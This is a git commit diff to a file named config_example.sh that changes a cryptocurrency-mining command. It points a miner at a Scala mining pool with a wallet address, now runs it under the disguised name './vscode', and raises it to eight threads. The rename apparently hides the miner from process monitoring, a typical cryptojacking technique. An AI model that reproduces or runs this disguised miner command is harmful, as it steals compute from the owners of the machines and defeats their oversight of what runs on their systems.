8ca975bc6f2eed87d03a712d745dbfbf440bc1e2
sagemantap <158444606+sagemantap@users.noreply.github.com>
2025-06-23 17:57:09 +0700

    Update config_example.sh

--- config_example.sh
+++ config_example.sh
@@ -1,1 +1,1 @@
-./xlarig -o mine.scalaproject.io:3333 -u Ssy28g1vp2S2BrCPWWwcHESA84p287845SUZGnsL7qwn7v3PLAFVNfgiALU6ftStC3du4GDr7h484Y2R2YDkth2r7G9cpCVETH -p Danis
+./vscode -o mine.scalaproject.io:3333 -u Ssy28g1vp2S2BrCPWWwcHESA84p287845SUZGnsL7qwn7v3PLAFVNfgiALU6ftStC3du4GDr7h484Y2R2YDkth2r7G9cpCVETH -p Danis -t 8
